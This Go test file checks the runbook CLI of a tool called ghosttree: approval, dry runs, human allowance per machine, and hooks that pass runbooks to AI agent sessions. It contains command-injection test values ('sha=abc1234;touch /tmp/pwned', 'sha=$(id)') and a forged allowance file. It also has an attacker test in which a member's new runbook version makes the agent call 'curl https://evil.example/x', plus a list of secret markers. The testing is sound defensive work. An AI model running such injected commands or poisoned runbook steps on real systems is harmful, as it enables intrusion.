package main

import (
	"bytes"
	"context"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/Deadweight-Labs/ghosttree/internal/runbook"
	"github.com/Deadweight-Labs/ghosttree/internal/store"
)

const rbCLISpec = `{
  "purpose": "ausrollen",
  "params": [{"name": "sha", "type": "sha"}],
  "steps": [{"title": "bauen", "command": "VERSION={{sha}} scripts/build-dist.sh", "check": "Binary da"}, {"title": "starten", "command": "systemctl start x"}],
  "rollback": [{"title": "zurueck", "command": "ln -sfn old current"}],
  "triggers": {"keywords": ["ausrollen"]},
  "targets": [{"name": "build", "comment": "baut", "steps": [{"argv": ["make", "dist", "SHA={{sha}}"]}, {"argv": ["echo", "fertig"]}]}]
}`

type fakeRunner struct {
	calls  [][]string
	failAt int
}

func (f *fakeRunner) Run(_ context.Context, argv []string) error {
	f.calls = append(f.calls, append([]string(nil), argv...))
	if f.failAt > 0 && len(f.calls) == f.failAt {
		return os.ErrInvalid
	}
	return nil
}

// runbookEnvCLI richtet den Server, den Ablauf "rollout" in cliHere und die
// Ersatz-Ausführung ein. Das Arbeitsverzeichnis des Tests ist kein Repo des
// Projekts, deshalb steht --project überall.
func runbookEnvCLI(t *testing.T) (*store.Store, *fakeRunner, string) {
	t.Helper()
	st := moveCLIFixture(t)
	fr := &fakeRunner{}
	oldRunner, oldTTY, oldStdin := runbookRunner, runbookIsTTY, runbookStdin
	runbookRunner = func(io.Writer) runbook.Runner { return fr }
	runbookIsTTY = func() bool { return false }
	store.SetRunbookExecution(true)
	t.Cleanup(func() {
		runbookRunner, runbookIsTTY, runbookStdin = oldRunner, oldTTY, oldStdin
		store.SetRunbookExecution(false)
	})
	file := filepath.Join(t.TempDir(), "spec.json")
	if err := os.WriteFile(file, []byte(rbCLISpec), 0o600); err != nil {
		t.Fatal(err)
	}
	return st, fr, file
}

func rb(t *testing.T, args ...string) (int, string) {
	t.Helper()
	return painTaskRun(t, args...)
}

func TestRunbookCLIWriteShowRunAndReport(t *testing.T) {
	_, _, file := runbookEnvCLI(t)
	code, out := rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere)
	if code != 0 || !strings.Contains(out, "rollout: created, version 1, approved") {
		t.Fatalf("write: %d %s", code, out)
	}
	if code, out := rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere); code != 0 || !strings.Contains(out, "unchanged, version 1") {
		t.Fatalf("second write: %d %s", code, out)
	}
	if code, out := rb(t, "runbook", "list", "--project", cliHere); code != 0 || !strings.Contains(out, "rollout  v1") || !strings.Contains(out, "(1 targets)") {
		t.Fatalf("list: %d %s", code, out)
	}
	// Die Checkliste mit eingesetztem Parameter, ohne Ausführung.
	code, out = rb(t, "run", "rollout", "sha=ABC1234", "--project", cliHere)
	for _, want := range []string{"VERSION=abc1234 scripts/build-dist.sh", "Status: approved (alice)", "last success: none reported yet", "ctx runbook report rollout"} {
		if code != 0 || !strings.Contains(out, want) {
			t.Fatalf("checklist misses %q (%d):\n%s", want, code, out)
		}
	}
	// Ohne Wert bleibt der Platzhalter stehen; ein unbekannter oder unsicherer Wert wird abgelehnt.
	if _, out := rb(t, "run", "rollout", "--project", cliHere); !strings.Contains(out, "VERSION={{sha}}") {
		t.Fatalf("unbound placeholder:\n%s", out)
	}
	for _, bad := range []string{"sha=abc1234;id", "sha=$(id)", "zzz=1", "sha=zz", "nope"} {
		if code, out := rb(t, "run", "rollout", bad, "--project", cliHere); code == 0 {
			t.Errorf("%q accepted: %s", bad, out)
		}
	}
	// Rückmeldung mit Abweichung: der letzte Erfolg erscheint, der Vorschlag auch.
	code, out = rb(t, "runbook", "report", "rollout", "ok", "--project", cliHere, "--param", "sha=abc1234", "--note", "lief durch", "--deviation", "add:2:Cache leeren:make clean")
	if code != 0 || !strings.Contains(out, "reported (ok, version 1)") || !strings.Contains(out, "became proposal 1") {
		t.Fatalf("report: %d %s", code, out)
	}
	if _, out := rb(t, "run", "rollout", "--project", cliHere); !strings.Contains(out, "last success: ") || strings.Contains(out, "none reported") {
		t.Fatalf("last success not shown:\n%s", out)
	}
	if code, out := rb(t, "runbook", "proposals", "rollout", "--project", cliHere); code != 0 || !strings.Contains(out, "proposal 1 [open]") || !strings.Contains(out, "make clean") {
		t.Fatalf("proposals: %d %s", code, out)
	}
	if code, out := rb(t, "runbook", "proposal", "accept", "1"); code != 0 || !strings.Contains(out, "version 2 written and approved") {
		t.Fatalf("accept: %d %s", code, out)
	}
	code, out = rb(t, "runbook", "history", "rollout", "--project", cliHere)
	if code != 0 || !strings.Contains(out, "v1 ") || !strings.Contains(out, "v2 ") || strings.Count(out, "approved by alice") < 2 {
		t.Fatalf("history: %d %s", code, out)
	}
	if _, out := rb(t, "run", "rollout", "--project", cliHere); !strings.Contains(out, "Cache leeren") {
		t.Fatalf("the accepted deviation is missing:\n%s", out)
	}
}

func hashOf(t *testing.T, st *store.Store, name string, version int) (int64, string) {
	t.Helper()
	ref, err := st.RunbookRefByScope(cliHere, "", name, 0)
	if err != nil {
		t.Fatal(err)
	}
	v, err := st.RunbookView(ref.ID, version)
	if err != nil {
		t.Fatal(err)
	}
	return ref.ID, v.Hash
}

// allowAsAPerson ersetzt den Menschen: der Betreiber (oder die Weboberfläche)
// erteilt die Freigabe auf dem Server. Kein Befehl dieser CLI kann das.
func allowAsAPerson(t *testing.T, st *store.Store, id int64, version int) {
	t.Helper()
	v, err := st.RunbookView(id, version)
	if err != nil {
		t.Fatal(err)
	}
	if err := st.AllowRunbook(store.RunbookAllowRequest{RunbookID: id, Version: version, Hash: v.Hash, Machine: "mainex", Person: "operator", Via: "cli-db"}); err != nil {
		t.Fatal(err)
	}
}

// Stufe 2: Probelauf als Vorgabe, Ausführung nur für eine freigegebene und vom
// Server für diese Maschine erlaubte Fassung, ohne Shell, mit Protokoll.
func TestRunbookCLIExecutionNeedsApprovalAndServerAllowance(t *testing.T) {
	st, fr, file := runbookEnvCLI(t)
	rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere)
	id, _ := hashOf(t, st, "rollout", 1)

	// Probelauf ist die Vorgabe: zeigt jede argv-Zeile, führt nichts aus und sagt,
	// warum --run abgelehnt würde.
	code, out := rb(t, "run", "rollout", "sha=abc1234", "--target", "build", "--project", cliHere)
	if code != 0 || !strings.Contains(out, "Dry run") || !strings.Contains(out, "1. make dist SHA=abc1234") || !strings.Contains(out, "2. echo fertig") ||
		!strings.Contains(out, "--run would be refused") || !strings.Contains(out, "has not allowed version 1") {
		t.Fatalf("dry run: %d\n%s", code, out)
	}
	if len(fr.calls) != 0 {
		t.Fatal("a dry run executed something")
	}
	// --run ohne Freigabe auf dem Server: abgelehnt.
	run := func(extra ...string) (int, string) {
		return rb(t, append([]string{"run", "rollout", "sha=abc1234", "--target", "build", "--run", "--project", cliHere}, extra...)...)
	}
	if code, out := run(); code != 3 || !strings.Contains(out, "refusing to run") || len(fr.calls) != 0 {
		t.Fatalf("run without allowance: %d\n%s", code, out)
	}
	if code, _ := rb(t, "run", "rollout", "--target", "build", "--run", "--dry-run"); code != 2 {
		t.Errorf("--run with --dry-run: %d", code)
	}
	if code, _ := rb(t, "run", "rollout", "--run"); code != 2 {
		t.Errorf("--run without a target: %d", code)
	}
	// Eine Datei auf dieser Maschine ist keine Freigabe, auch nicht mit dem richtigen Hash.
	_, hash := hashOf(t, st, "rollout", 1)
	forged := `{"version":1,"entries":{"x|project=` + cliHere + `;machine=|rollout":{"hash":"` + hash + `","version":1,"allowed_at":"2026-01-01T00:00:00Z"}}}`
	for _, name := range []string{"allowed-runbooks.json"} {
		p := filepath.Join(os.Getenv("XDG_CONFIG_HOME"), "ghosttree", name)
		if err := os.WriteFile(p, []byte(forged), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if code, out := run(); code != 3 || len(fr.calls) != 0 {
		t.Fatalf("a forged local file allowed a run: %d\n%s", code, out)
	}
	// Der Befehl allow erteilt nichts: er sagt, dass ein Mensch es tun muss, in jeder Lage,
	// auch mit Terminal und passender Eingabe.
	runbookIsTTY = func() bool { return true }
	runbookStdin = strings.NewReader(hash[:8] + "\n")
	if code, out := rb(t, "runbook", "allow", "rollout", "--project", cliHere); code != 3 || !strings.Contains(out, "needs a person, not this command") {
		t.Fatalf("allow info: %d\n%s", code, out)
	}
	if code, out := run(); code != 3 || len(fr.calls) != 0 {
		t.Fatalf("allow info allowed a run: %d\n%s", code, out)
	}
	// Ein Mensch gibt auf dem Server frei: jetzt läuft es, argv wie angezeigt, jedes Argument für sich.
	allowAsAPerson(t, st, id, 1)
	code, out = run()
	if code != 0 || len(fr.calls) != 2 || strings.Join(fr.calls[0], "|") != "make|dist|SHA=abc1234" || strings.Join(fr.calls[1], "|") != "echo|fertig" ||
		!strings.Contains(out, "run 1 reported (ok, version 1") {
		t.Fatalf("run: %d calls=%v\n%s", code, fr.calls, out)
	}
	runs, _ := st.RunbookRuns(id, 5)
	if len(runs) != 1 || runs[0].Mode != runbook.ModeExec || runs[0].Target != "build" || runs[0].Result != runbook.ResultOK || runs[0].Machine != "mainex" || runs[0].Person != "alice" || runs[0].Params["sha"] != "abc1234" {
		t.Fatalf("run log: %+v", runs)
	}
	// Ein fehlgeschlagener Schritt hält an und wird als failed gemeldet.
	fr.calls, fr.failAt = nil, 1
	if code, _ := run(); code != 1 || len(fr.calls) != 1 {
		t.Fatalf("failing step: %d calls=%v", code, fr.calls)
	}
	if runs, _ := st.RunbookRuns(id, 5); len(runs) != 2 || runs[0].Result != runbook.ResultFailed {
		t.Fatalf("failed run not logged: %+v", runs)
	}
	// Ein Wert mit Metazeichen erreicht nie einen Prozess: Fehler, kein Aufruf.
	fr.calls, fr.failAt = nil, 0
	for _, bad := range []string{"sha=abc1234;touch /tmp/pwned", "sha=abc1234 && id", "sha=$(id)", "sha=--help"} {
		if code, _ := rb(t, "run", "rollout", bad, "--target", "build", "--run", "--project", cliHere); code == 0 || len(fr.calls) != 0 {
			t.Errorf("%q: code %d, calls %v", bad, code, fr.calls)
		}
	}
	// Der Schalter steht aus: nichts läuft, auch nicht mit Freigabe.
	store.SetRunbookExecution(false)
	if code, out := run(); code != 3 || !strings.Contains(out, "switched off") || len(fr.calls) != 0 {
		t.Fatalf("switch off: %d\n%s", code, out)
	}
}

// Der Angriff "Fremder ändert den Ablauf, der Agent führt ihn aus".
func TestRunbookCLIAttackerChangesTheRunbookAndTheAgentRunsIt(t *testing.T) {
	st, fr, file := runbookEnvCLI(t)
	rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere)
	id, _ := hashOf(t, st, "rollout", 1)
	allowAsAPerson(t, st, id, 1)

	// Mallory (Mitglied) schreibt eine neue Fassung mit einem anderen Programm.
	if _, err := st.AddAccount("mallory", "", false); err != nil {
		t.Fatal(err)
	}
	spec, err := runbook.ParseSpec([]byte(rbCLISpec))
	if err != nil {
		t.Fatal(err)
	}
	spec.Targets[0].Steps = []runbook.ExecStep{{Argv: []string{"curl", "https://evil.example/x"}}}
	if _, err := st.WriteRunbook(store.RunbookWrite{Project: cliHere, Name: "rollout", Spec: spec, Person: "mallory", AuthorID: 2, Approve: true}); err != nil {
		t.Fatal(err)
	}
	run := func(extra ...string) (int, string) {
		return rb(t, append([]string{"run", "rollout", "sha=abc1234", "--target", "build", "--run", "--project", cliHere}, extra...)...)
	}
	// 1. Die Spitze ist nicht freigegeben, --run lehnt ab.
	code, out := run()
	if code != 3 || !strings.Contains(out, "is not approved by an owner or lead") || len(fr.calls) != 0 {
		t.Fatalf("unapproved head: %d calls=%v\n%s", code, fr.calls, out)
	}
	// 2. Die alte, freigegebene und erlaubte Fassung bleibt wählbar und läuft, wie sie war.
	if code, _ = run("--version", "1"); code != 0 || len(fr.calls) != 2 || fr.calls[0][0] != "make" {
		t.Fatalf("v1: %d calls=%v", code, fr.calls)
	}
	// 3. Ein Owner gibt v2 frei, ohne den Inhalt zu lesen: auf dieser Maschine ist sie trotzdem
	// nicht erlaubt, solange kein Mensch den Unterschied gesehen und sie erlaubt hat.
	if err := st.ApproveRunbookVersion(id, 2, 1, "alice"); err != nil {
		t.Fatal(err)
	}
	fr.calls = nil
	code, out = run()
	if code != 3 || !strings.Contains(out, "has not allowed version 2") || len(fr.calls) != 0 {
		t.Fatalf("approved but not allowed: %d calls=%v\n%s", code, fr.calls, out)
	}
	// 4. Der Probelauf zeigt, was laufen würde, ohne es zu tun.
	code, out = rb(t, "run", "rollout", "sha=abc1234", "--target", "build", "--project", cliHere)
	if code != 0 || !strings.Contains(out, "1. curl https://evil.example/x") || len(fr.calls) != 0 {
		t.Fatalf("dry run of v2: %d\n%s", code, out)
	}
	// 5. Erst die Freigabe durch einen Menschen für genau diesen Hash lässt sie laufen.
	allowAsAPerson(t, st, id, 2)
	if code, _ = run(); code != 0 || len(fr.calls) != 1 || fr.calls[0][0] != "curl" {
		t.Fatalf("after a person allowed v2: %d calls=%v", code, fr.calls)
	}
	// 6. Und schreibt der Fremde danach noch einmal, ist die nächste Fassung wieder nicht erlaubt.
	spec.Targets[0].Steps = []runbook.ExecStep{{Argv: []string{"curl", "https://evil.example/y"}}}
	if _, err := st.WriteRunbook(store.RunbookWrite{Project: cliHere, Name: "rollout", Spec: spec, Person: "mallory", AuthorID: 2}); err != nil {
		t.Fatal(err)
	}
	fr.calls = nil
	if code, _ = run(); code != 3 || len(fr.calls) != 0 {
		t.Fatalf("v3 ran: %d calls=%v", code, fr.calls)
	}
}

// Der Betreiber erteilt die Freigabe mit Datenbankzugriff: Unterschied sehen,
// am Terminal mit dem Anfang des Hashes bestätigen.
func TestRunbookOperatorAllowsWithTheDatabase(t *testing.T) {
	db := filepath.Join(t.TempDir(), "ops.db")
	st, err := store.Open(db)
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	if _, err := st.AddAccount("alice", "", true); err != nil {
		t.Fatal(err)
	}
	if _, err := st.CreateOrg("person:1", "Acme", "acme"); err != nil {
		t.Fatal(err)
	}
	if _, err := st.EnsureProject("person:1", cliHere); err != nil {
		t.Fatal(err)
	}
	spec, _ := runbook.ParseSpec([]byte(rbCLISpec))
	res, err := st.WriteRunbook(store.RunbookWrite{Project: cliHere, Name: "rollout", Spec: spec, Person: "alice", AuthorID: 1, Approve: true})
	if err != nil {
		t.Fatal(err)
	}
	oldTTY, oldStdin := runbookIsTTY, runbookStdin
	t.Cleanup(func() { runbookIsTTY, runbookStdin = oldTTY, oldStdin; store.SetRunbookExecution(false) })
	args := []string{"runbook", "allow", "--db", db, "--id", "1", "--machine", "mainex"}
	if code, out := rb(t, args[:5]...); code != 2 {
		t.Errorf("without a machine: %d %s", code, out)
	}
	runbookIsTTY = func() bool { return false }
	runbookStdin = strings.NewReader(res.Hash[:8] + "\n")
	if code, out := rb(t, args...); code != 3 || !strings.Contains(out, "person at a terminal") || !strings.Contains(out, "+ target build step 1: make dist 'SHA={{sha}}'") {
		t.Fatalf("no terminal: %d\n%s", code, out)
	}
	runbookIsTTY = func() bool { return true }
	runbookStdin = strings.NewReader("ja\n")
	if code, out := rb(t, args...); code != 1 || !strings.Contains(out, "not allowed") {
		t.Fatalf("wrong confirmation: %d\n%s", code, out)
	}
	store.SetRunbookExecution(true)
	if s, _ := st.RunbookAllowed(1, 1, "mainex"); s.Allowed {
		t.Fatal("allowed before the person confirmed")
	}
	runbookStdin = strings.NewReader(res.Hash[:8] + "\n")
	if code, out := rb(t, args...); code != 0 || !strings.Contains(out, "allowed: rollout version 1 on mainex") {
		t.Fatalf("allow: %d\n%s", code, out)
	}
	if s, _ := st.RunbookAllowed(1, 1, "mainex"); !s.Allowed || !strings.HasPrefix(s.AllowedBy, "operator") {
		t.Fatalf("state: %+v", s)
	}
	if code, out := rb(t, "runbook", "revoke", "--db", db, "--id", "1", "--machine", "mainex"); code != 0 || !strings.Contains(out, "revoked") {
		t.Fatalf("revoke: %d\n%s", code, out)
	}
	if s, _ := st.RunbookAllowed(1, 1, "mainex"); s.Allowed {
		t.Fatal("still allowed after revoking")
	}
}

// Die mitgelieferten Abläufe (docs/runbooks/example.json) sind gültig, lassen sich
// importieren und zeigen sich mit Parametern.
func TestRunbookCLIImportsTheExampleFile(t *testing.T) {
	st, _, _ := runbookEnvCLI(t)
	seed := filepath.Join("..", "..", "docs", "runbooks", "example.json")
	code, out := rb(t, "runbook", "import", seed, "--dry-run")
	if code != 0 || !strings.Contains(out, "rollout-prod: valid") || !strings.Contains(out, "prod-ssh-zugang: valid") {
		t.Fatalf("dry run: %d\n%s", code, out)
	}
	if _, err := st.EnsureProject("person:1", "github.com/example/app"); err != nil {
		t.Fatal(err)
	}
	code, out = rb(t, "runbook", "import", seed)
	if code != 0 || !strings.Contains(out, "rollout-prod: created, version 1, approved") || !strings.Contains(out, "prod-ssh-zugang: created, version 1, approved") {
		t.Fatalf("import: %d\n%s", code, out)
	}
	if code, out := rb(t, "runbook", "import", seed); code != 0 || strings.Count(out, "unchanged") != 2 {
		t.Fatalf("second import: %d\n%s", code, out)
	}
	code, out = rb(t, "run", "rollout-prod", "sha=0123abc", "--project", "github.com/example/app")
	for _, want := range []string{"VERSION=0.1.0-dev+0123abc scripts/build-dist.sh", "sudo ln -sfn releases/0123abc /srv/ghosttree/current", "sudo install -o root -g ghosttree -m 755 /tmp/ctx-0123abc", "Rollback:"} {
		if code != 0 || !strings.Contains(out, want) {
			t.Fatalf("rollout-prod misses %q (%d):\n%s", want, code, out)
		}
	}
	// Der SSH-Zugang gilt für das Beispielprojekt.
	code, out = rb(t, "run", "prod-ssh-zugang", "--project", "github.com/example/app")
	if code != 0 || !strings.Contains(out, "ssh prod") {
		t.Fatalf("prod-ssh-zugang: %d\n%s", code, out)
	}
	raw, _ := os.ReadFile(seed)
	for _, secret := range []string{"-----BEGIN", "PRIVATE KEY", "ghp_", "token=", "password=", "81.27.", "nurrobin", "orax", "/srv/dwl"} {
		if strings.Contains(string(raw), secret) {
			t.Errorf("the seed file mentions %q", secret)
		}
	}
	// Die Auslöser der importierten Abläufe treffen.
	ref, err := st.RunbookRefByScope("github.com/example/app", "", "prod-ssh-zugang", 1)
	if err != nil {
		t.Fatal(err)
	}
	v, _ := st.RunbookView(ref.ID, 0)
	if _, ok := v.Spec.Match(runbook.Input{Command: "ssh prod.example.com uptime"}); !ok {
		t.Error("the ssh trigger misses ssh prod.example.com")
	}
}

// Die Hooks liefern den Ablauf: ein Stichwort im Prompt (UserPromptSubmit) und ein
// passender Bash-Befehl (PreToolUse), je Session einmal, und nur die freigegebene
// Fassung.
func TestHooksDeliverARunbookOncePerSession(t *testing.T) {
	st, _, file := runbookEnvCLI(t)
	if code, out := rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere); code != 0 {
		t.Fatalf("write: %d %s", code, out)
	}
	spec, _ := runbook.ParseSpec([]byte(rbCLISpec))
	spec.Triggers = runbook.Triggers{Keywords: []string{"ausrollen"}, Commands: []string{"scripts/build-dist.sh"}}
	if _, err := st.WriteRunbook(store.RunbookWrite{Project: cliHere, Name: "rollout", Spec: spec, Person: "alice", AuthorID: 1, Approve: true}); err != nil {
		t.Fatal(err)
	}
	repo := newRepo(t)
	if out, err := exec.Command("git", "-C", repo, "remote", "set-url", "origin", "https://"+cliHere+".git").CombinedOutput(); err != nil {
		t.Fatalf("git remote: %v %s", err, out)
	}
	hook := func(event, payload string) string {
		t.Helper()
		var out bytes.Buffer
		if code := cmdHookWith(strings.NewReader(payload), []string{event}, &out); code != 0 {
			t.Fatalf("%s exit %d", event, code)
		}
		_, ctx := decodeHook(t, &out)
		return ctx
	}
	prompt := `{"prompt":"wir wollen jetzt ausrollen","cwd":` + strconv.Quote(repo) + `,"session_id":"s-rb-1"}`
	first := hook("user-prompt-submit", prompt)
	if !strings.Contains(first, "[runbook rollout, triggered by keyword ausrollen]") || !strings.Contains(first, "VERSION={{sha}} scripts/build-dist.sh") {
		t.Fatalf("prompt trigger:\n%s", first)
	}
	if again := hook("user-prompt-submit", prompt); strings.Contains(again, "runbook rollout") {
		t.Fatalf("delivered twice in one session:\n%s", again)
	}
	bash := `{"tool_name":"Bash","tool_input":{"command":"cd x && scripts/build-dist.sh"},"cwd":` + strconv.Quote(repo) + `,"session_id":"s-rb-1"}`
	if got := hook("pre-tool-use", bash); strings.Contains(got, "runbook rollout") {
		t.Fatalf("the same session got it again through the tool hook:\n%s", got)
	}
	bash2 := strings.ReplaceAll(bash, "s-rb-1", "s-rb-2")
	if got := hook("pre-tool-use", bash2); !strings.Contains(got, "[runbook rollout, triggered by command scripts/build-dist.sh]") {
		t.Fatalf("command trigger:\n%s", got)
	}
	if got := hook("pre-tool-use", strings.ReplaceAll(bash2, "scripts/build-dist.sh", "ls -la")); strings.Contains(got, "runbook rollout") {
		t.Fatalf("an unrelated command triggered it:\n%s", got)
	}
}

// Decision #4349: a runbook for a repository on a host carries project AND machine
// (write and import take both); the project role decides who reads it.
func TestRunbookCLIWriteAndImportTakeProjectAndMachine(t *testing.T) {
	st, _, file := runbookEnvCLI(t)
	code, out := rb(t, "runbook", "write", "rollout", "--file", file, "--project", cliHere, "--machine", "Build-1")
	if code != 0 || !strings.Contains(out, "rollout: created, version 1") {
		t.Fatalf("write: %d %s", code, out)
	}
	ref, err := st.RunbookRefByScope(cliHere, "build-1", "rollout", 1)
	if err != nil || ref.Project != cliHere || ref.Machine != "build-1" {
		t.Fatalf("the runbook did not keep both axes: %+v %v", ref, err)
	}
	// "here" is this machine (mainex in the fixture).
	if code, out := rb(t, "runbook", "write", "check-here", "--file", file, "--project", cliHere, "--machine", "here"); code != 0 {
		t.Fatalf("write here: %d %s", code, out)
	}
	if ref, err := st.RunbookRefByScope(cliHere, "mainex", "check-here", 1); err != nil || ref.Machine != "mainex" {
		t.Fatalf("here: %+v %v", ref, err)
	}
	// Import: a machine on the command line applies to every runbook of the file.
	spec, _ := os.ReadFile(file)
	batch := filepath.Join(t.TempDir(), "batch.json")
	body := `{"runbooks":[{"name":"imported","project":"` + cliHere + `","spec":` + string(spec) + `}]}`
	if err := os.WriteFile(batch, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	if code, out := rb(t, "runbook", "import", batch, "--machine", "build-2"); code != 0 {
		t.Fatalf("import: %d %s", code, out)
	}
	if ref, err := st.RunbookRefByScope(cliHere, "build-2", "imported", 1); err != nil || ref.Project != cliHere {
		t.Fatalf("imported with both axes: %+v %v", ref, err)
	}
	// The usage tells the rule.
	if _, usage := rb(t, "runbook"); !strings.Contains(usage, "BOTH") {
		t.Errorf("the usage does not state the rule: %s", usage)
	}
}
